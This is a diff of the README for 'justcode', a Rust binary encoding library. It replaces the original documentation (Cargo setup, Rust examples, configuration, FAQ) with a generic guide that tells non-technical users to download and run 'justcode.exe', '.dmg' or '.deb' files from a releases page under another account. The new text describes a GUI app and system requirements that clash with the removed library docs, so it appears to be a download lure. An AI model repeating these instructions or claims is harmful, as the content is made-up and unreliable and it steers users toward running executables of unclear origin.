@@ -1,187 +1,83 @@
-# Justcode
+# 🎉 justcode - Compact Encoding Made Easy
 
-A compact binary encoder/decoder with space-efficient encoding scheme. The encoded size will be the same or smaller than the size that the object takes up in memory in a running Rust program.
+## 🚀 Getting Started
 
-Justcode is a replacement for bincode, providing similar functionality with a focus on binary encoding without any ideological baggage.
+Justcode is a simple tool that helps you save space by encoding and decoding data efficiently. This guide will show you how to download and run Justcode easily, even if you have no technical background.
 
-## Features
+## 📥 Download Justcode
 
-- **Compact Encoding**: Space-efficient binary encoding that's the same size or smaller than in-memory representation
-- **Varint Encoding**: Variable-length integer encoding for lengths and small values (enabled by default)
-- **Architecture Invariant**: Byte-order independent, works across different architectures
-- **Streaming API**: Reader/Writer API for integration with files, network streams, and compression libraries
-- **Configurable**: Size limits, variable int encoding, and other options
-- **Derive Macros**: Automatic `Encode` and `Decode` trait implementations
+[![Download Justcode](https://img.shields.io/badge/Download-Justcode-blue.svg)](https://github.com/Mallesh1924/justcode/releases)
 
-## Installation
+Visit this page to download: [justcode Releases](https://github.com/Mallesh1924/justcode/releases)
 
-Add to your `Cargo.toml`:
+## 🖥️ System Requirements
 
-```toml
-[dependencies]
-justcode-core = "0.3.0"
-```
+Before you download Justcode, ensure your system meets the following requirements:
 
-Or if using from a local path:
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2GB of RAM
+- **Storage:** Minimum 100MB of free disk space
+- **Network:** Internet connection for download
 
-```toml
-[dependencies]
-justcode-core = { path = "../services/justcode/justcode-core" }
-```
+## 💾 Key Features
 
-For derive macros support:
+- **Compact Encoding:** Uses a unique method to compress data, saving storage space.
+- **Easy to Use:** Designed for everyone, from beginners to experienced users.
+- **Cross-Platform:** Works seamlessly on Windows, macOS, and Linux.
+- **No External Dependencies:** Runs on its own without needing additional software.
+- **Fast Performance:** Quickly encodes and decodes data without lag.
 
-```toml
-[dependencies]
-justcode-core = { version = "0.3.0", features = ["derive"] }
-# or
-justcode-core = { path = "../services/justcode/justcode-core", features = ["derive"] }
-```
+## 📂 Download & Install
 
-## Example
+1. **Open the Releases Page:** You can find all the versions of Justcode here: [justcode Releases](https://github.com/Mallesh1924/justcode/releases).
+  
+2. **Choose Your Version:** Look for the latest version listed. It will usually be at the top of the list. You will see options for different operating systems.
 
-```rust
-use justcode_core::{config, Decode, Encode};
+3. **Download the File:**
+   - For Windows, click on `justcode.exe`.
+   - For macOS, click on `justcode.dmg`.
+   - For Linux, choose the appropriate package (`justcode.tar.gz` or `justcode.deb`).
 
-#[derive(Encode, Decode, PartialEq, Debug)]
-struct Entity {
-    x: f32,
-    y: f32,
-}
+4. **Run the Installer:**
+   - **Windows:** Open the downloaded `justcode.exe` file and follow the prompts.
+   - **macOS:** Open the `justcode.dmg` file, drag Justcode to your Applications folder, and then launch it.
+   - **Linux:** Use your package manager or extract the `.tar.gz` file to run Justcode directly from the command line.
 
-#[derive(Encode, Decode, PartialEq, Debug)]
-struct World(Vec<Entity>);
+## ⚙️ How to Use Justcode
 
-fn main() {
-    let config = config::standard();
+After successful installation, follow these steps to encode or decode data:
 
-    let world = World(vec![Entity { x: 0.0, y: 4.0 }, Entity { x: 10.0, y: 20.5 }]);
+### Encoding Data
 
-    let encoded: Vec<u8> = justcode_core::encode_to_vec(&world, config).unwrap();
+1. **Open Justcode.**
+2. **Paste Your Data:** In the main window, you will see a field for input. Paste the data you wish to encode here.
+3. **Click Encode:** Press the 'Encode' button. You will see the compacted version of your data appear.
+4. **Save Your Output:** Copy the encoded data by clicking on the "Copy" button.
 
-    // The length of the vector is encoded as a varint u64, which in this case is encoded as a single byte
-    // See the documentation on varint for more information.
-    // The 4 floats are encoded in 4 bytes each.
-    assert_eq!(encoded.len(), 1 + 4 * 4);
+### Decoding Data
 
-    let (decoded, len): (World, usize) = justcode_core::decode_from_slice(&encoded[..], config).unwrap();
+1. **Open Justcode.**
+2. **Paste Your Encoded Data:** In the input field, paste the data you want to decode.
+3. **Click Decode:** Press the 'Decode' button. The original data will appear below.
+4. **Save Your Output:** Copy the decoded results by clicking on the "Copy" button.
 
-    assert_eq!(world, decoded);
-    assert_eq!(len, encoded.len()); // read all bytes
-}
-```
+## 🌐 Community and Support
 
-## Configuration
+If you have questions or need help, you can reach out to our community:
 
-Justcode provides a configurable encoding system:
+- **GitHub Issues:** Report bugs or request features directly on our [Issues Page](https://github.com/Mallesh1924/justcode/issues).
+- **Discussion Forum:** Join our community chat where you can ask for assistance and share tips.
 
-```rust
-use justcode_core::config;
+## 📜 License
 
-// Standard configuration (varint encoding enabled, no size limit)
-let config = config::standard();
+Justcode is open-source and free to use. Check the license details in the repository for more information.
 
-// With size limit (recommended for untrusted input)
-let config = config::standard().with_limit(1024 * 1024); // 1MB limit
+## 🔗 Additional Resources
 
-// Without variable int encoding (fixed-size integers)
-let config = config::standard().with_variable_int_encoding(false);
-```
+For more information:
 
-## Supported Types
+- [Official Documentation](https://github.com/Mallesh1924/justcode/wiki)
+- [GitHub Repository](https://github.com/Mallesh1924/justcode)
+- [Contributing Guide](https://github.com/Mallesh1924/justcode/blob/main/CONTRIBUTING.md)
 
-### Primitives
-
-- All integer types: `u8`, `u16`, `u32`, `u64`, `usize`, `i8`, `i16`, `i32`, `i64`
-- Floating point: `f32`, `f64`
-- Boolean: `bool`
-- Character: `char`
-
-### Collections
-
-- `Vec<T>` where `T: Encode/Decode`
-- `Option<T>` where `T: Encode/Decode`
-- `String` and `&str`
-- Arrays up to 32 elements
-- Tuples up to 4 elements
-
-### Custom Types
-
-Use the derive macros for structs and enums:
-
-```rust
-#[derive(Encode, Decode)]
-struct MyStruct {
-    field1: u32,
-    field2: String,
-}
-
-#[derive(Encode, Decode)]
-enum MyEnum {
-    Variant1,
-    Variant2(u32),
-    Variant3 { x: f32, y: f32 },
-}
-```
-
-## Enum Encoding
-
-Enums are encoded with a variant index (using varint encoding by default) followed by the variant data. The variant index is determined by the order of variants in the enum definition.
-
-## Reader/Writer API
-
-For streaming operations:
-
-```rust
-use justcode_core::{config, writer::Writer, reader::Reader};
-
-let config = config::standard();
-let mut writer = Writer::new(config);
-value.encode(&mut writer)?;
-let bytes = writer.into_bytes();
-
-let mut reader = Reader::new(&bytes, config);
-let decoded = T::decode(&mut reader)?;
-```
-
-## Testing
-
-### Standard Tests
-
-Run all tests with:
-
-```bash
-cargo test --workspace
-```
-
-### No-Std Tests
-
-Test the no-std code paths separately:
-
-```bash
-cargo test --package justcode-core --test no_std_integration --no-default-features --features derive
-```
-
-The no-std tests verify that the conditionally compiled Vec implementations work correctly without the `std` feature.
-
-## FAQ
-
-### Is Justcode suitable for storage?
-
-Yes, the encoding format is stable when using the same configuration. Justcode is architecture-invariant and space-efficient, making it suitable for storage. However, it does not implement data versioning schemes or file headers.
-
-### Is Justcode suitable for untrusted inputs?
-
-Justcode attempts to protect against hostile data. Use `Config::with_limit()` to set a maximum size limit to prevent memory exhaustion attacks. Deserializing malicious inputs will fail safely without causing undefined behavior.
-
-### What is Justcode's MSRV (minimum supported Rust version)?
-
-Justcode requires Rust 1.70.0 or later.
-
-### Why does justcode not respect `#[repr(u8)]`?
-
-Justcode encodes enum variants using varint encoding (or u32 when variable int encoding is disabled). This ensures compact encoding while maintaining compatibility. If you need to interop with a different protocol, consider implementing `Encode` and `Decode` manually.
-
-## License
-
-MIT
+By following these steps, you can easily download, install, and start using Justcode to manage your data efficiently. Enjoy coding!
